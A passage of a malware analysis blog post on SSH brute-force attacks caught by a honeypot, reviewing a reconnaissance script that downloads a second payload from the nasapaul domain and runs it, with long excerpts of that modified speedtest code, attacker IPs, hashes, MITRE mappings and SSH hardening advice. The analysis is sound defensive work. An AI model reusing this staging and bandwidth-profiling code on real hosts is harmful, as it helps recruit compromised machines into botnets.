<code>ninfo</code> announces <code>speed testul incepe in 3 secunde</code> (speed test starts in three seconds) then echos out a countdown to standard out. In line <code>83</code> it pulls down a second payload from the <code>nasapaul</code> domain named <code>v.py</code>. In line <code>84</code> the script attempts to run that payload with <code>perl</code>. The following screenshot shows the output of <code>ninfo</code> if run without network connectivity or simulation:</p><p><img src=/img/022-ninfo03.png alt="ninfo color output example"></p><h3 id=additional-details>Additional Details<a hidden class=anchor aria-hidden=true href=#additional-details>#</a></h3><h4 id=source-ip-origin>Source IP Origin<a hidden class=anchor aria-hidden=true href=#source-ip-origin>#</a></h4><p>The following information was sourced from the Talos Intelligence IP Reputation Lookup. This does not confirm an origin of attack, but rather gives us insight into the last hop on the internet. It is noted all IP addresses are owned by corporations associated with cloud hosting services.</p><table><thead><tr><th>IP</th><th>NETWORK OWNER</th><th>LOCATION</th></tr></thead><tbody><tr><td>52.152.130.178</td><td>Microsoft Corporation</td><td>Washington, United States</td></tr><tr><td>64.225.101.223</td><td>Digital Ocean</td><td>Frankfurt am Main, Germany</td></tr><tr><td>167.99.253.119</td><td>Digital Ocean</td><td>Frankfurt am Main, Germany</td></tr><tr><td>167.172.24.118</td><td>Digital Ocean</td><td>Clifton, United States</td></tr><tr><td>178.62.231.95</td><td>Digital Ocean</td><td>Amsterdam, Netherlands</td></tr><tr><td>188.166.99.239</td><td>Digital Ocean</td><td>Amsterdam, Netherlands</td></tr><tr><td>188.166.124.29</td><td>Digital Ocean</td><td>Amsterdam, Netherlands</td></tr><tr><td></td><td></td><td></td></tr></tbody></table><p>A <code>whois</code> search for these IP addresses identify an organizational link <code>ORG-DOI2-RIPE</code> between some of the attacking IPs:</p><ul><li><code>167.172.24.118/24</code></li><li><code>178.62.231.95/24</code></li><li><code>188.166.99.239/24</code></li><li><code>188.166.124.29/24</code></li></ul><p><img src=/img/022-doi2ripe.png alt="DOI2-RIPE org"></p><h4 id=language-indicators>Language Indicators<a hidden class=anchor aria-hidden=true href=#language-indicators>#</a></h4><p>An identifying characteristic of this script is that the language used is a mix of English and Romanian. Searchinging for <code>drept de root</code>, <code>versiune</code>, <code>testul incepe in</code>, and <code>secunde</code> via google translator returns a language match for Romanian.</p><p>A google search using code from the second payload <code>v.py</code> returns two positive hits:</p><ol><li>A <a href=https://github.com/funtimes-ninja/malware/blob/master/18e532867e1f6dff1db8fe095f7defab4cacba9652d08f7ede9c73b0e04dce9e>malware sample</a> from a github repo of malware collected by honeypots uploaded in DEC 2017.</li><li>A <code>speedtest-cli</code> github repository pointing to file <a href=https://github.com/sivel/speedtest-cli/blob/master/speedtest.py>speedtest.py</a> from Matt Martz.</li></ol><p>To test to see if any files from github user <code>sivel</code> are being used by the attacker I hashed all files from the <code>speedtest-cli</code> github repo and compared these hashes against the hash for <code>v.py</code>. None of the hashes are matches, this means that if the attacker used a file from this repository it has since been modified. The results are shown below:</p><pre><code>86aa0f938b6d6a3b2ba54481f1debae2  v.py

051b5371b2a098f10d8271bbfbcd8ee6  CONTRIBUTING.md
3b83ef96387f14655fc854ddc3c6bd57  LICENSE
89ba249b2bf282b2ea9c35e5fd3a197d  MANIFEST.in
8192020c86e390adb168431fdbf260c1  README.rst
0566968464b829958e9bf431eb1db62f  setup.cfg
2a22f34184b9275db470c39026428709  setup.py
6697b8da88cf890de4b057c0151aad2a  speedtest-cli.1
322eb3ec52f028e6b1df6bd0a9f6cb52  speedtest.py
37547186527ed0466ae145073f9012d1  tox.ini
test/scripts/
51b873473209d18958a05c767723836b  source.py
</code></pre><h2 id=vpy-code-review><code>v.py</code> code review<a hidden class=anchor aria-hidden=true href=#vpy-code-review>#</a></h2><p>The file <code>v.py</code> is <code>803</code> lines long, substantially longer than <code>ninfo</code>. If you would like to examine this file for yourself it can be retrieved from <a href=https://github.com/malwaremily/malware-samples/tree/main/february_2020/nasapaul_collection>this</a> github repository. Now we can review the code in <code>v.py</code> in order to understand more about its behavior.</p><h3 id=overview-in-comments>Overview in Comments<a hidden class=anchor aria-hidden=true href=#overview-in-comments>#</a></h3><p>This attacker put a lot of comments into their code. We see the following statements printed to console:</p><pre><code>1. Retrieving NasaPaul.com configuration
2. Retrieving NasaPaul.com server list
</code></pre><p>The attacker switches to Romanian (the English translation is shown):</p><pre><code>3. Host Server is Google Cloud (Paul hides the IPs)
4. Looking for a server
5. Found a server start testing
</code></pre><p>And then they use English&mldr;</p><pre><code>6. testing download speed
</code></pre><p>Then Romanian&mldr;</p><pre><code>7. Download speed is XYZ Mbit/s
</code></pre><p>Then English, and then Romanian again.</p><pre><code>8. Testing upload speed
9. The flood upload is XYZ Mbit/s
</code></pre><p>After which point the script ends and the botnet logs out. Note that <code>XYZ</code> in this instance is a substitute for an upload/download speed value.</p><h3 id=main-function>Main Function<a hidden class=anchor aria-hidden=true href=#main-function>#</a></h3><p>I begin by looking at the main function <code>def main()</code> found on lines <code>793</code> - <code>797</code>. The only defined functions called here are <code>speedtest()</code> and <code>print_()</code>.</p><pre><code>def main():
    try:
        speedtest()
    except KeyboardInterrupt:
        print_('\nCancelling...')
</code></pre><p>The <code>speedtest</code> function is defined in the file on lines <code>553</code> - <code>790</code>. We can get a sense of what the script is doing by logically following the calls to subroutines. This means you follow each call to a defined function, like a choose your own adventure book instead of reading the file start to finish. Though, you could totally do that too if you want to get a sense of the functions that might be called or preview to see if anything stylistically looks out of place or different. This code review will highlight some of the code using the comments printed to the console. If you&rsquo;d like to skip ahead to the next section click <a href=#impact>here</a>.</p><h3 id=retrieving-configuration-from-nasapaulcom>Retrieving configuration from nasapaul[.]com<a hidden class=anchor aria-hidden=true href=#retrieving-configuration-from-nasapaulcom>#</a></h3><p>References to <code>nasapaul[.]com</code> are seen within <code>speedtest()</code> on lines <code>624</code> and <code>632</code>.</p><p><img src=/img/022-v01.png alt="Calling home to nasapaul[.]com"></p><p>The excerpt below has been pulled from lines <code>623</code> - <code>624</code>. Line <code>623</code> prints <code>Retrieving NasaPaul.com configuration...'</code> to console. This step of the python script executes regardless of internet connectivity.</p><pre><code>    if not args.simple:
        print_('\033[1;31m&gt;&gt;&gt;&gt; Retrieving \033[1;37m NasaPaul.com\033[1;m \033[1;31m configuration...')
    try:
        config = getConfig()
    except URLError:
        print_('Cannot retrieve speedtest configuration')
        sys.exit(1)
</code></pre><p>In case you are wondering why <code>args.simple</code> returns true each execution, note that <code>args</code> is set by the the options parser seen in lines <code>568</code> to <code>604</code> where <code>--simple</code> becomes <code>args.simple</code> as <code>args</code> is set to an <code>options</code> tuple. <code>options</code> is created from <code>parser.parse_args()</code>. This logic is shared below:</p><pre><code>    description = (
        'Command line interface for testing internet bandwidth using '
        'speedtest.net.\n'
        '------------------------------------------------------------'
        '--------------\n'
        'https://github.com/sivel/speedtest-cli')

    parser = ArgParser(description=description)
    # Give optparse.OptionParser an `add_argument` method for
    # compatibility with argparse.ArgumentParser
    try:
        parser.add_argument = parser.add_option
    except AttributeError:
        pass
    parser.add_argument('--bytes', dest='units', action='store_const',
                        const=('byte', 1), default=('bit', 8),
                        help='Display values in bytes instead of bits. Does '
                             'not affect the image generated by --share')
    parser.add_argument('--share', action='store_true',
                        help='Generate and provide a URL to the speedtest.net '
                             'share results image')
    parser.add_argument('--simple', action='store_true',
                        help='Suppress verbose output, only show basic '
                             'information')
    parser.add_argument('--list', action='store_true',
                        help='Display a list of speedtest.net servers '
                             'sorted by distance')
    parser.add_argument('--server', help='Specify a server ID to test against')
    parser.add_argument('--mini', help='URL of the Speedtest Mini server')
    parser.add_argument('--source', help='Source IP address to bind to')
    parser.add_argument('--timeout', default=10, type=int,
                        help='HTTP timeout in seconds. Default 10')
    parser.add_argument('--secure', action='store_true',
                        help='Use HTTPS instead of HTTP when communicating '
                             'with speedtest.net operated servers')
    parser.add_argument('--version', action='store_true',
                        help='Show the version number and exit')

    options = parser.parse_args()
    if isinstance(options, tuple):
        args = options[0]
    else:
        args = options
    del options
</code></pre><p>Returning to the first block of code, after <code>Retrieving NasaPaul.com configuration...'</code> is printed to console, on line <code>626</code> we see a call to <code>getConfig()</code>. This function seen in lines <code>376</code> - <code>414</code> is shared below:</p><pre><code>def getConfig():
    &quot;&quot;&quot;Download the speedtest.net configuration and return only the data
    we are interested in
    &quot;&quot;&quot;

    request = build_request('://www.speedtest.net/speedtest-config.php')
    uh, e = catch_request(request)
    if e:
        print_('Could not retrieve speedtest.net configuration: %s' % e)
        sys.exit(1)
    configxml = []
    while 1:
        configxml.append(uh.read(10240))
        if len(configxml[-1]) == 0:
            break
    if int(uh.code) != 200:
        return None
    uh.close()
    try:
        try:
            root = ET.fromstring(''.encode().join(configxml))
            config = {
                'client': root.find('client').attrib,
                'times': root.find('times').attrib,
                'download': root.find('download').attrib,
                'upload': root.find('upload').attrib}
        except AttributeError:  # Python3 branch
            root = DOM.parseString(''.join(configxml))
            config = {
                'client': getAttributesByTagName(root, 'client'),
                'times': getAttributesByTagName(root, 'times'),
                'download': getAttributesByTagName(root, 'download'),
                'upload': getAttributesByTagName(root, 'upload')}
    except SyntaxError:
        print_('Failed to parse speedtest.net configuration')
        sys.exit(1)
    del root
    del configxml
    return config
</code></pre><p>In the function snippet below pulled from <code>getConfig()</code> above, a <code>request</code> is built using <code>build_request</code> for <code>speedtest.net</code>. <code>build_request</code> &ldquo;build[s] a urllib2 request object to automatically add a user-agent header to all requests&rdquo; for a url.</p><pre><code>    request = build_request('://www.speedtest.net/speedtest-config.php')
    uh, e = catch_request(request)
</code></pre><p>Following the creation of <code>request</code>, <code>catch_request</code> is described as &ldquo;a helper function to catch common exceptions when establishing a connection with a HTTP/S request.&rdquo; The result of the <code>catch_request(request)</code> and any resulting errors are stored in variables <code>uh</code> and <code>e</code> respectively. If an error is created and stored in variable <code>e</code> the script will gracefully exit:</p><pre><code>if e:
        print_('Could not retrieve speedtest.net configuration: %s' % e)
        sys.exit(1)
</code></pre><p>On lines <code>386</code> - <code>393</code> of the <code>getConfig()</code> function a variable <code>configxml</code> of type tuple is created. The response from <code>www.speedtest.net/speedtest-config.php</code> in variable <code>uh</code> is appended to <code>configxml</code>. <code>configxml[-1]</code> points to the last value in the tuple <code>configxml</code>. If the length of this value is zero, then the while loop can break. If the value of the response from <code>speednet.com</code> is anything other than 200 OK then <code>None</code> is returned from <code>getConfig()</code>.</p><pre><code>configxml = []
    while 1:
        configxml.append(uh.read(10240))
        if len(configxml[-1]) == 0:
            break
    if int(uh.code) != 200:
        return None
    uh.close()
</code></pre><p>While the commented code reads, &ldquo;retrieving configuration nasapaul[.]com&rdquo; this behavior was not confirmed in the python script. Only communication to <code>www.speedtest.net/speedtest-config.php</code> was observed.</p><h3 id=retrieving-nasapaul-server-list>Retrieving nasapaul Server List<a hidden class=anchor aria-hidden=true href=#retrieving-nasapaul-server-list>#</a></h3><p>Lines <code>631</code> - <code>644</code> handle commands related to the <code>Retrieving NasaPaul[.]com server list...</code> comment printed to console:</p><pre><code>if not args.simple:
        print_('\033[1;31m&gt;&gt;&gt;&gt; Retrieving \033[1;37m NasaPaul.com\033[1;m \033[1;31m  server list...')
    if args.list or args.server:
        servers = closestServers(config['client'], True)
        if args.list:
            serverList = []
            for server in servers:
                line = ('%(id)4s) %(sponsor)s (%(name)s, %(country)s) '
                        '[%(d)0.2f km]' % server)
                serverList.append(line)
            print_('\n'.join(serverList).encode('utf-8', 'ignore'))
            sys.exit(0)
    else:
        servers = closestServers(config['client'])
</code></pre><p>We want to look at the <code>closestServers</code> functions to get a better idea of what servers are being used in this block of code. If you want to review these functions briefly check out this <a href=https://gist.github.com/malwaremily/61eb848cdd0e05a6895b153727abc6e6>gist</a>.</p><p>Looking at the <code>closestServers()</code> definition, the urls in use are:</p><pre><code>     urls = [
        '://www.speedtest.net/speedtest-servers-static.php',
        '://c.speedtest.net/speedtest-servers-static.php',
        '://www.speedtest.net/speedtest-servers.php',
        '://c.speedtest.net/speedtest-servers.php',
    ]
</code></pre><p>Similar to what we&rsquo;ve seen previously in <code>getConfig()</code> we see calls out to the listered urls using <code>build_request</code> and <code>catch_request</code>:</p><pre><code>for url in urls:
        try:
            request = build_request(url)
            uh, e = catch_request(request)
            if e:
                errors.append('%s' % e)
                raise SpeedtestCliServerListError
            serversxml = []
            while 1:
                serversxml.append(uh.read(10240))
                if len(serversxml[-1]) == 0:
                    break
            if int(uh.code) != 200:
                uh.close()
                raise SpeedtestCliServerListError
            uh.close()
</code></pre><p>While the commented code read, <code>retrieving nasapaul[.]com server list</code> this behavior was not confirmed in the python script. Instead calls to <code>speedtest.net</code> are seen.</p><h3 id=host-server-is-google-cloud-paul-hides-the-ips>Host Server is Google Cloud (Paul hides the IPs)<a hidden class=anchor aria-hidden=true href=#host-server-is-google-cloud-paul-hides-the-ips>#</a></h3><p>On lines <code>645</code> and <code>648</code> a <code>print_</code> statement below prints out <code>Server Hostat De</code> (Hosted Server) and <code>Paul ascunde IPu</code> (Paul hides the IPu).</p><pre><code>
if not args.simple:
        print_('\033[1;31m&gt;&gt;&gt;&gt; Server Hostat De \033[1;m \033[1;37m%(isp)s\033[1;m (\033[1;37mPaul ascunde IPu\033[1;m)\033[1;37m...' % config['client'])

</code></pre><p>However, this part of the script will print the ISP in use to console but no such evidence of &ldquo;hiding IPs&rdquo; was found in the python script.</p><h3 id=looking-for-and-finding-a-server>Looking for and Finding a Server<a hidden class=anchor aria-hidden=true href=#looking-for-and-finding-a-server>#</a></h3><p>Similar to the previous comment the comments, <code>Cautam ce-l mai bun server</code>(We are looking for the best server) and <code>Server Gasit incepem Testele</code>(Server found, tests are started) are printed to console prior to a call to <code>getBestServers()</code>.</p><pre><code>        if not args.simple:
            print_('\033[1;31m&gt;&gt;&gt;&gt; Cautam ce-l mai bun server \033[1;m')
            print_('\033[1;31m&gt;&gt;&gt;&gt; Server Gasit incepem Testele \033[1;m')
        best = getBestServer(servers)
</code></pre><p>The function <code>getBestServers()</code> is defined on lines <code>498</code> - <code>534</code>:</p><pre><code>def getBestServer(servers):
    &quot;&quot;&quot;Perform a speedtest.net latency request to determine which
    speedtest.net server has the lowest latency
    &quot;&quot;&quot;

    results = {}
    for server in servers:
        cum = []
        url = '%s/latency.txt' % os.path.dirname(server['url'])
        urlparts = urlparse(url)
        for i in range(0, 3):
            try:
                if urlparts[0] == 'https':
                    h = HTTPSConnection(urlparts[1])
                else:
                    h = HTTPConnection(urlparts[1])
                headers = {'User-Agent': user_agent}
                start = timeit.default_timer()
                h.request(&quot;GET&quot;, urlparts[2], headers=headers)
                r = h.getresponse()
                total = (timeit.default_timer() - start)
            except (HTTPError, URLError, socket.error):
                cum.append(3600)
                continue
            text = r.read(9)
            if int(r.status) == 200 and text == 'test=test'.encode():
                cum.append(total)
            else:
                cum.append(3600)
            h.close()
        avg = round((sum(cum) / 6) * 1000, 3)
        results[avg] = server
    fastest = sorted(results.keys())[0]
    best = results[fastest]
    best['latency'] = fastest

    return best
</code></pre><p>In this function, the passed variable <code>servers</code> has been set in lines <code>634</code> or <code>644</code> via a call to <code>closestServers()</code> using output created from the <code>configServer()</code> function, discussed in the previous sections. I found no evidence to suggest that any servers related to <code>nasapaul[.]com</code> were queried.</p><h3 id=testing-download-and-upload-speeds>Testing Download and Upload Speeds<a hidden class=anchor aria-hidden=true href=#testing-download-and-upload-speeds>#</a></h3><p>Finally, the download and upload speeds are collected using functions <code>downloadspeed()</code> and <code>uploadspeed()</code>.</p><pre><code>    if not args.simple:
        print_(('\033[1;31m&gt;&gt;&gt;&gt; Server Intretinut de \033[1;37m%(sponsor)s\033[1;m (\033[1;37m%(name)s\033[1;m) \033[1;m[\033[1;37m%(d)0.2f km\033[1;m]\033[1;37m:\033[1;37m '
               '%(latency)s ms\033[1;31m' % best).encode('utf-8', 'ignore'))
    else:
        print_('Ping: %(latency)s ms' % best)

    sizes = [350, 500, 750, 1000, 1500, 2000, 2500, 3000, 3500, 4000]
    urls = []
    for size in sizes:
        for i in range(0, 4):
            urls.append('%s/random%sx%s.jpg' %
                        (os.path.dirname(best['url']), size, size))
    if not args.simple:
        print_('&gt;&gt;&gt;&gt; Testing download speed', end='')
    dlspeed = downloadSpeed(urls, args.simple)
    if not args.simple:
        print_()
    print_('&gt;&gt;&gt;&gt; Download-ul este de  : \033[1;37m%0.2f M%s/s' %
    
           ((dlspeed / 1000 / 1000) * args.units[1], args.units[0]))

    sizesizes = [int(.25 * 1000 * 1000), int(.5 * 1000 * 1000)]
    sizes = []
    for size in sizesizes:
        for i in range(0, 25):
            sizes.append(size)
    if not args.simple:
        print_('\033[1;31m&gt;&gt;&gt;&gt; Testing upload speed', end='')
    ulspeed = uploadSpeed(best['url'], sizes, args.simple)
    if not args.simple:
        print_()
    print_('&gt;&gt;&gt;&gt; Upload-ul de flood este : \033[1;37m%0.2f M%s/s\033[1;31m' %
           ((ulspeed / 1000 / 1000) * args.units[1], args.units[0]))

    if args.share and args.mini:
        print_('Cannot generate a speedtest.net share results image while '
               'testing against a Speedtest Mini server')
    elif args.share:
        dlspeedk = int(round((dlspeed / 1000) * 8, 0))
        ping = int(round(best['latency'], 0))
        ulspeedk = int(round((ulspeed / 1000) * 8, 0))
</code></pre><p>The <code>uploadspeed()</code> and <code>downloadspeed()</code> functions launch FileGetter and FilePutter threats to calculate upload/download speeds. Nothing in these functions appeared malicious nor did they redirect to a malicious url.</p><p>It is noted, however, that the results of the speed test are sent to <code>speedtest[.]net</code>. This code is shown below:</p><pre><code>        # Build the request to send results back to speedtest.net
        # We use a list instead of a dict because the API expects parameters
        # in a certain order
        apiData = [
            'download=%s' % dlspeedk,
            'ping=%s' % ping,
            'upload=%s' % ulspeedk,
            'promo=',
            'startmode=%s' % 'pingselect',
            'recommendedserverid=%s' % best['id'],
            'accuracy=%s' % 1,
            'serverid=%s' % best['id'],
            'hash=%s' % md5(('%s-%s-%s-%s' %
                             (ping, ulspeedk, dlspeedk, '297aae72'))
                            .encode()).hexdigest()]

        headers = {'Referer': 'http://c.speedtest.net/flash/speedtest.swf'}
        request = build_request('://www.speedtest.net/api/api.php',
                                data='&amp;'.join(apiData).encode(),
                                headers=headers)
        f, e = catch_request(request)
        if e:
            print_('Could not submit results to speedtest.net: %s' % e)
            sys.exit(1)
        response = f.read()
        code = f.code
        f.close()
</code></pre><p>In an effort to be clear, I will repeat that <code>speedtest.net</code> is the only domain used in the <code>v.py</code> script aside from the <code>nasapaul[.]com</code> references printed to console using <code>print_()</code>. All network related communication in the <code>v.py</code> script appears limited to <code>speedtest.net</code>.</p><h1 id=impact>Impact<a hidden class=anchor aria-hidden=true href=#impact>#</a></h1><p>Successful execution of <code>ninfo</code> results in losing information about system specification including hardware or virtualized hardware specifications described in the <a href=#collection>Collection</a> section above. Successful execution of <code>v.py</code> results in information about the system&rsquo;s bandwidth and level of privilege associated with the compromised login. This information is relayed to the attacker via the SSH session. Typically, these types of collections are stored and re-used either for manipulation by the original attacker or they could be sold on a criminal network for use in a DDoS for hire like a DDoSaaS offering.</p><p>All of these attacks originated from successful bruteforce attempts against SSH. There are a few strategies you can use to protect against SSH attacks. You could move the SSH port to a non-default port (e.g. from p22 to p43895). This will subvert some automated attacks, but it is a weak control because the new SSH port can be identified with a simple <code>nmap</code> scan. A more effective way to protect against SSH attacks would be to authenticate using an SSH key or using certificate-based authentication. To pair with this control, you should modify the global ssh configuration file (<code>/etc/ssh/ssh_config</code>) to disable password authentication. You could also use a service like <code>fail2ban</code> to put IPs with repeated failed authentication attempts to SSH on a denylist. For example, if an IP address fails to authenticate 10 times in a row <code>fail2ban</code> would <code>jail</code> the IP, effectively preventing it from being able to login using SSH for a period of time.</p><h2 id=unanswered-questions--opinions>Unanswered Questions & Opinions<a hidden class=anchor aria-hidden=true href=#unanswered-questions--opinions>#</a></h2><p>In my opinion these security events may be the result of a botnet looking for victim hosts to utilize as a part of a DDoS network and/or to be used to serve and collect information about other vulnerable hosts. I have reached this conclusion because the commands seen in the repeated security event are limited to collection information related to computer specifications and bandwidth. Another potential explaination could be that the botnet is searching for victims to mine cryptocurrency. Without further information, these conclusions are purely speculative.</p><p>There are a few questions leftover from this case I am still asking myself. Foremost in my mind is seeing a python script run with <code>perl</code>. I could see <code>perl</code> being remapped to a <code>python</code> binary but this behavior was not seen in <code>ninfo</code>. How does that work? Is the <code>#!/usr/bin/env python</code> on line <code>1</code> of the file enough for the interpreter to know to use <code>python</code> instead of <code>perl</code>? If I learn anything new related to this event I&rsquo;ll update and mark the date at the top of this post and/or link to more information.</p><h1 id=detections>Detections<a hidden class=anchor aria-hidden=true href=#detections>#</a></h1><p>When scanned with clamAV no detections are yet seen:</p><p><img src=/img/022-clamscan.png alt="clamscan results with clamav"></p><p>When I first uploaded <code>ninfo</code> to virustotal on 2021-02-23 it had 1/64 antivirus detections. Since then, the number has increased to 6/64.</p><p><img src=/img/022-6detections.png alt="ninfo virustotal results"></p><p><code>v.py</code> remains at undetected as of 2021-02-27. This is not surprising since the script is a a bandwidth test that reaches out to a known good site, <a href=https://www.speedtest.net/>Speedtest by Ookla</a>. Whether the script is malicious or not could be of debate, though, since this specific script <code>v.py</code> used in the context of data collection I would flag the hash.</p><p><img src=/img/022-nodetections.png alt="v.py virustotal results"></p><h2 id=network>Network<a hidden class=anchor aria-hidden=true href=#network>#</a></h2><p>The following IP addresses were associated with one or more successful SSH brute force attacks.</p><pre><code>52.152.130.178 
64.225.101.223
167.99.253.119
167.172.24.118
178.62.231.95
188.166.99.239
188.166.124.29
</code></pre><h2 id=dns>DNS<a hidden class=anchor aria-hidden=true href=#dns>#</a></h2><p>The following hostnames were associated with one or more of the security events described in this post.</p><pre><code>nasapaul[.]com
wpmudev[.]host
</code></pre><h2 id=file-hashes>File Hashes<a hidden class=anchor aria-hidden=true href=#file-hashes>#</a></h2><h4 id=md5sum>md5sum<a hidden class=anchor aria-hidden=true href=#md5sum>#</a></h4><pre><code>678af2ec3251f8692c9324ffe64c198a  ninfo
86aa0f938b6d6a3b2ba54481f1debae2  v.py
</code></pre><h4 id=sha256sum>sha256sum<a hidden class=anchor aria-hidden=true href=#sha256sum>#</a></h4><pre><code>19778a62055770a9e5f890e52227ccd39251bf23045c15383411638540ceabf7  ninfo
00e430b733cf199747c9c6e0f2e2fae6a045bbed9c0f0f993112b301fcdf5dbc  v.py
</code></pre><h1 id=mitre-tactics>MITRE Tactics<a hidden class=anchor aria-hidden=true href=#mitre-tactics>#</a></h1><ul><li>T1595 <a href=https://attack.mitre.org/techniques/T1595/001/>Active Scanning: Scanning IP Blocks</a></li><li>T1110 Brute Force<ul><li><a href=https://attack.mitre.org/techniques/T1110/001/>Password Guessing</a></li><li><a href=https://attack.mitre.org/techniques/T1110/003/>Password Spraying</a></li></ul></li><li>T1190 <a href=https://attack.mitre.org/techniques/T1190/>Exploit Public-Facing Application</a></li><li>T1078 <a href=https://attack.mitre.org/techniques/T1078/003/>Valid Accounts: Local Accounts</a></li><li>T1119 <a href=https://attack.mitre.org/techniques/T1119/>Automated Collection</a></li><li>T1059 Command and Scripting Interpreter<ul><li><a href=https://attack.mitre.org/techniques/T1059/004/>Unix Shell</a></li><li><a href=https://attack.mitre.org/techniques/T1059/006/>Python</a></li></ul></li><li>T1070 <a href=https://attack.mitre.org/techniques/T1070/004/>Indicator Removal on Host: File Deletion</a></li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://malwaremily.com/tags/honeytrap/>HoneyTrap</a></li><li><a href=https://malwaremily.com/tags/honeypot/>honeypot</a></li><li><a href=https://malwaremily.com/tags/botnet/>botnet</a></li><li><a href=https://malwaremily.com/tags/ssh/>SSH</a></li><li><a href=https://malwaremily.com/tags/analysis/>analysis</a></li><li><a href=https://malwaremily.com/tags/honeypot-logs/>honeypot logs</a></li><li><a href=https://malwaremily.com/tags/malware/>malware</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2021 <a href=https://malwaremily.com/>malwaremily</a></span>
<span>&#183;</span>
<span>Made with ♥ by Emily</span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>window.onload=function(){if(localStorage.getItem("menu-scroll-position")){document.getElementById('menu').scrollLeft=localStorage.getItem("menu-scroll-position");}}
document.querySelectorAll('a[href^="#"]').forEach(anchor=>{anchor.addEventListener("click",function(e){e.preventDefault();var id=this.getAttribute("href").substr(1);if(!window.matchMedia('(prefers-reduced-motion: reduce)').matches){document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({behavior:"smooth"});}else{document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();}
if(id==="top"){history.replaceState(null,null," ");}else{history.replaceState(null,null,`#${id}`);}});});var mybutton=document.getElementById("top-link");window.onscroll=function(){if(document.body.scrollTop>800||document.documentElement.scrollTop>800){mybutton.style.visibility="visible";mybutton.style.opacity="1";}else{mybutton.style.visibility="hidden";mybutton.style.opacity="0";}};function menu_on_scroll(){localStorage.setItem("menu-scroll-position",document.getElementById('menu').scrollLeft);}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{if(document.body.className.includes("dark")){document.body.classList.remove('dark');localStorage.setItem("pref-theme",'light');}else{document.body.classList.add('dark');localStorage.setItem("pref-theme",'dark');}})</script></body></html>